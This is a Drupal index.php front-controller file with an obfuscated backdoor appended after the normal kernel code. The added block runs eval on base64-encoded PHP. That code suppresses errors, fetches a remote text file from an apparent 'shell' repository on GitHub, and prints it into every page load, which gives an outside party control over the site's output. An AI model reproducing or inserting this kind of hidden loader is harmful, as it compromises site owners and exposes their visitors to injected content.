<?php

/**
 * @file
 * The PHP page that serves all page requests on a Drupal installation.
 *
 * All Drupal code is released under the GNU General Public License.
 * See COPYRIGHT.txt and LICENSE.txt files in the "core" directory.
 */

use Drupal\Core\DrupalKernel;
use Symfony\Component\HttpFoundation\Request;

$autoloader = require_once 'autoload.php';

$kernel = new DrupalKernel('prod', $autoloader);

$request = Request::createFromGlobals();
$response = $kernel->handle($request);
$response->send();

$kernel->terminate($request, $response);
?>
<?php
eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKJGtpbGwgPSBjdXJsX2luaXQoKTsKY3VybF9zZXRvcHQoJGtpbGwsIENVUkxPUFRfVVJMLCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vib2t6c3NzL3NoZWxsZWJvay9tYWluL3MudHh0Iik7CmN1cmxfc2V0b3B0KCRraWxsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKJGRlYWQgPSBjdXJsX2V4ZWMoJGtpbGwpOwpjdXJsX2Nsb3NlKCRraWxsKTsKZWNobygkZGVhZCk7'));
?>
